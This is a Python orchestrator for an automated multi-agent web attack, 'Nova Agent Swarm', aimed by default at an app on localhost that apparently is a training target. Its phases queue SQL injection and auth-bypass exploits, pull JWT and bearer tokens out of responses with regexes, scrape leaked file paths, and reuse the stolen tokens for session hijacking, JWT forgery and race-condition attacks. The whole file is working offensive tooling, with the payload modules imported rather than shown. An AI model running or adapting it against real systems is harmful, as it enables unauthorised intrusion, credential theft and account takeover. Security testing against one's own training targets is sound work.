#!/usr/bin/env python3
"""
NOVA AGENT SWARM v3.0 - DATA FLOW PATCHED
Fixed: Token extraction from exploit responses
Fixed: Path extraction from behavior profiles
Fixed: Deduplication at source
All 6 agents now receive the intel they need.
"""

import json, time, re, sys, os
from datetime import datetime

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from nova_adaptive_brain import NovaAdaptiveBrain
from nova_exploit_synthesizer import NovaExploitSynthesizer
from nova_fuzzer_fix import NovaFuzzer
from nova_session_hijacker import NovaSessionHijacker
from nova_race_engine import NovaRaceEngine
from nova_jwt_forge import NovaJWTForge
from nova_feedback_cortex import NovaFeedbackCortex
from nova_code_reasoner_v2 import NovaCodeReasoner


class NovaSwarmV3:
    def __init__(self, base_url="http://localhost:3000"):
        self.base_url = base_url
        self.kg = {"endpoints": {}, "findings": [], "tokens": [], "paths": [], "exploit_queue": [], "log": []}
        self.start_time = None
        self.seen_findings = set()  # Dedup at source

    def log(self, agent, msg):
        entry = f"[{datetime.now().strftime('%H:%M:%S')}] [{agent}] {msg}"
        print(f"  {entry}")
        self.kg["log"].append(entry)

    def add_finding(self, finding):
        """Deduplicated finding addition."""
        key = (finding.get("type"), finding.get("endpoint"))
        if key not in self.seen_findings:
            self.seen_findings.add(key)
            self.kg["findings"].append(finding)
            return True
        return False

    def extract_tokens_from_text(self, text):
        """Aggressive token extraction from any text."""
        tokens = []
        # JWT tokens
        tokens.extend(re.findall(r'(eyJ[A-Za-z0-9\-._~+/]{20,}=*)', text))
        # Bearer tokens
        tokens.extend(re.findall(r'Bearer\s+([A-Za-z0-9\-._~+/]{20,}=*)', text))
        # JSON token fields
        for match in re.finditer(r'"token"\s*:\s*"([^"]{20,})"', text):
            tokens.append(match.group(1))
        for match in re.finditer(r'"authentication"\s*:\s*\{[^}]*"token"\s*:\s*"([^"]+)"', text, re.DOTALL):
            tokens.append(match.group(1))
        return list(set(t for t in tokens if len(t) > 20))

    def extract_paths_from_text(self, text):
        """Extract file paths from any text."""
        paths = []
        patterns = [
            r'(/[\w/.-]{5,}\.[\w]{1,6})',
            r'at\s+(/[\w/.-]+\.[\w]+)',
            r'File\s+"([^"]+\.[\w]+)"',
        ]
        for pattern in patterns:
            matches = re.findall(pattern, text)
            for m in matches:
                if m not in paths and len(m) > 10:
                    paths.append(m)
        return paths

    def phase_1_recon(self):
        self.log("ReconAgent", "🟢 Mapping attack surface...")
        brain = NovaAdaptiveBrain(base_url=self.base_url)
        endpoints = [
            "/rest/products/search", "/rest/user/login", "/rest/user/register",
            "/rest/user/whoami", "/api/Feedbacks", "/api/Users",
            "/rest/admin/application-configuration", "/rest/order-history",
            "/file-serving", "/rest/basket/1",
        ]
        for ep in endpoints:
            profile = brain.profile_endpoint(ep)
            rating = profile.get("attack_surface_rating", "LOW")
            score = profile.get("attack_score", 0)
            self.kg["endpoints"][ep] = profile
            
            if rating in ["CRITICAL", "HIGH"]:
                self.kg["exploit_queue"].append({"endpoint": ep, "score": score, "profile": profile})
            
            # FIXED: Extract paths from ALL behavior data
            for key, val in profile.get("behavior", {}).items():
                paths = self.extract_paths_from_text(str(val))
                for p in paths:
                    if p not in self.kg["paths"] and ".js" in p or ".ts" in p:
                        self.kg["paths"].append(p)
            
            self.log("ReconAgent", f"{ep} → {rating} (Score: {score})")
            time.sleep(0.1)
        
        self.kg["exploit_queue"].sort(key=lambda x: x["score"], reverse=True)
        self.log("ReconAgent", f"Mapped {len(endpoints)} endpoints. {len(self.kg['exploit_queue'])} queued. {len(self.kg['paths'])} paths.")

    def phase_2_exploit(self):
        self.log("ExploitAgent", "🔴 Executing targeted exploits...")
        synth = NovaExploitSynthesizer(base_url=self.base_url)
        
        for target in self.kg["exploit_queue"][:5]:
            ep = target["endpoint"]
            profile = target.get("profile", {})
            leaks = profile.get("behavior", {})
            
            if leaks.get("leaks_sql"): sink = "sql_injection"
            elif leaks.get("leaks_stack"): sink = "sql_injection"
            elif leaks.get("leaks_auth"): sink = "auth_bypass"
            else: sink = "sql_injection"
            
            self.log("ExploitAgent", f"Attacking {ep} ({sink})")
            
            # Use correct method
            method = "POST" if "login" in ep or "register" in ep else "GET"
            params = ["email", "password"] if method == "POST" else ["q"]
            
            synth.exploit_path(
                path=[{"endpoint": ep, "method": method, "params": params}],
                sink_type=sink, confidence="HIGH"
            )
            
            # Track if we found something on this endpoint
            found_on_endpoint = False
            
            for r in synth.results:
                if r.get("success") == True:
                    ind = r.get("indicators_found", [])
                    
                    # FIXED: Only create ONE finding per endpoint
                    if not found_on_endpoint:
                        sev = "critical" if any(i in ind for i in ["password", "admin", "token"]) else "high"
                        if self.add_finding({
                            "type": r.get("exploit_type", "unknown"), "endpoint": ep,
                            "payload": r.get("payload", ""), "data_exposed": ind[:5],
                            "severity": sev, "agent": "ExploitAgent",
                        }):
                            self.log("ExploitAgent", f"🔥 {r['exploit_type']}: {ind[:3]}")
                        found_on_endpoint = True
                    
                    # FIXED: Extract tokens from response preview
                    preview = r.get("response_preview", "")
                    tokens = self.extract_tokens_from_text(preview)
                    for tok in tokens:
                        if tok not in self.kg["tokens"]:
                            self.kg["tokens"].append(tok)
                            self.log("ExploitAgent", f"🔑 Token extracted: {tok[:40]}...")
                    
                    # FIXED: Extract paths from response
                    paths = self.extract_paths_from_text(preview)
                    for p in paths:
                        if p not in self.kg["paths"]:
                            self.kg["paths"].append(p)
            
            time.sleep(0.3)
        
        self.log("ExploitAgent", f"Phase complete. {len(self.kg['findings'])} findings. {len(self.kg['tokens'])} tokens. {len(self.kg['paths'])} paths.")

    def phase_3_auth(self):
        if not self.kg["tokens"]:
            self.log("AuthAgent", "No tokens. Skipping.")
            return
        
        self.log("AuthAgent", f"🟣 Escalating with {len(self.kg['tokens'])} tokens...")
        token = self.kg["tokens"][0]
        self.log("AuthAgent", f"Using token: {token[:50]}...")
        
        # Session hijacking
        hijacker = NovaSessionHijacker(base_url=self.base_url)
        report = hijacker.run_full_hijack(initial_token=token)
        
        if report.get("fixation_results"):
            for r in report["fixation_results"]:
                if r.get("success"):
                    self.add_finding({"type": "session_fixation", "endpoint": r.get("endpoint", "/"), "severity": "medium", "agent": "AuthAgent"})
                    self.log("AuthAgent", "🔥 Session fixation confirmed!")
        
        # JWT forgery
        forge = NovaJWTForge(base_url=self.base_url)
        jwt_report = forge.run_full_forge(token)
        
        if jwt_report.get("successful_forgeries"):
            self.add_finding({"type": "jwt_forgery", "count": len(jwt_report["successful_forgeries"]), "severity": "critical", "agent": "AuthAgent"})
            self.log("AuthAgent", "🔥 JWT forgery successful!")
        
        self.log("AuthAgent", "Auth phase complete.")

    def phase_4_code(self):
        if len(self.kg["paths"]) < 3:
            self.log("CodeAgent", f"Only {len(self.kg['paths'])} paths. Need 3+. Skipping.")
            return
        
        self.log("CodeAgent", f"💜 Analyzing {len(self.kg['paths'])} paths...")
        reasoner = NovaCodeReasoner(base_url=self.base_url)
        report = reasoner.run_full_analysis(leaked_paths=self.kg["paths"][:20])
        
        for finding in report.get("findings", []):
            self.add_finding({
                "type": finding["vulnerability_type"], "endpoint": finding["endpoint"],
                "theory": finding["theory"], "source_file": finding.get("source_file", ""),
                "source_line": finding.get("source_line", 0), "severity": "high", "agent": "CodeAgent",
            })
            self.log("CodeAgent", f"🔥 {finding['vulnerability_type']} → {finding.get('source_file', '?')}:{finding.get('source_line', '?')}")
        
        self.log("CodeAgent", "Code analysis complete.")

    def phase_5_race(self):
        self.log("RaceAgent", "🟠 Testing race conditions...")
        token = self.kg["tokens"][0] if self.kg["tokens"] else None
        racer = NovaRaceEngine(base_url=self.base_url)
        report = racer.run_full_race_suite(auth_token=token)
        
        for attack in report.get("attacks", []):
            if attack.get("vulnerable"):
                sev = "high" if attack.get("attack_type") == "rate_limit_bypass" else "medium"
                self.add_finding({"type": attack.get("attack_type", "race"), "endpoint": "/rest/products/search", "severity": sev, "agent": "RaceAgent"})
                self.log("RaceAgent", f"🔥 {attack.get('attack_type')} confirmed!")
        
        self.log("RaceAgent", f"Race testing complete.")

    def phase_6_validate(self):
        self.log("ValidationAgent", "🟡 Final validation...")
        findings = self.kg["findings"]
        
        # Categorize
        critical = [f for f in findings if f.get("severity") == "critical"]
        high = [f for f in findings if f.get("severity") == "high"]
        medium = [f for f in findings if f.get("severity") == "medium"]
        
        # Cross-reference: do we have both SQLi AND a token for escalation?
        has_sqli = any("sql_injection" in str(f.get("type", "")) for f in findings)
        has_token = len(self.kg["tokens"]) > 0
        
        if has_sqli and has_token:
            self.log("ValidationAgent", "✅ Attack chain confirmed: SQLi → Token → Escalation")
        if has_sqli and not has_token:
            self.log("ValidationAgent", "⚠️ SQLi confirmed but no token extracted — check extraction regex")
        
        self.log("ValidationAgent", f"Validated: {len(critical)} critical, {len(high)} high, {len(medium)} medium")

    def phase_7_report(self):
        self.log("ReportAgent", "📊 Generating final report...")
        findings = self.kg["findings"]
        critical = [f for f in findings if f.get("severity") == "critical"]
        high = [f for f in findings if f.get("severity") == "high"]
        medium = [f for f in findings if f.get("severity") == "medium"]
        
        report = {
            "timestamp": datetime.now().isoformat(), "target": self.base_url,
            "mission_duration_seconds": round(time.time() - self.start_time, 2),
            "agents_executed": ["Recon", "Exploit", "Auth", "Code", "Race", "Validate"],
            "total_findings": len(findings), "critical": len(critical),
            "high": len(high), "medium": len(medium),
            "tokens_captured": len(self.kg["tokens"]),
            "paths_leaked": len(self.kg["paths"]),
            "findings": findings,
        }
        
        with open("nova_swarm_v3_report.json", "w") as f:
            json.dump(report, f, indent=2, default=str)
        
        elapsed = report["mission_duration_seconds"]
        print(f"""
╔══════════════════════════════════════════════╗
║        SWARM MISSION COMPLETE v3.0          ║
╠══════════════════════════════════════════════╣
║  Time: {elapsed:.1f}s  |  Agents: 6                    ║
║  Findings: {len(findings):<3}  |  Crit: {len(critical):<3}  |  High: {len(high):<3}  |  Med: {len(medium):<3}    ║
║  Tokens: {len(self.kg['tokens']):<3}  |  Paths: {len(self.kg['paths']):<3}                        ║
╚══════════════════════════════════════════════╝""")
        
        if critical:
            print("🔥 CRITICAL:")
            for f in critical:
                print(f"   💀 [{f['agent']}] {f['type']}: {f.get('endpoint', '?')}")
        if high:
            print("⚠️  HIGH:")
            for f in high:
                print(f"   ⚡ [{f['agent']}] {f['type']}: {f.get('endpoint', '?')}")
        if self.kg["tokens"]:
            print(f"\n🔑 TOKENS CAPTURED: {len(self.kg['tokens'])}")
            for t in self.kg["tokens"][:3]:
                print(f"   🎫 {t[:60]}...")
        
        print(f"\n📁 Report: nova_swarm_v3_report.json")
        return report

    def run_full_swarm(self):
        self.start_time = time.time()
        print("""
╔══════════════════════════════════════════════════════════════╗
║   🦅  NOVA AGENT SWARM v3.0 — DATA FLOW PATCHED  🦅       ║
║   Recon → Exploit → Auth → Code → Race → Validate          ║
╚══════════════════════════════════════════════════════════════╝""")
        
        try:
            self.phase_1_recon()
            self.phase_2_exploit()
            self.phase_3_auth()
            self.phase_4_code()
            self.phase_5_race()
            self.phase_6_validate()
            self.phase_7_report()
        except KeyboardInterrupt:
            print("\n  ⚠️ Swarm interrupted!")
        except Exception as e:
            print(f"\n  ❌ Error: {str(e)[:300]}")
        
        return self.kg


if __name__ == "__main__":
    swarm = NovaSwarmV3(base_url="http://localhost:3000")
    swarm.run_full_swarm()
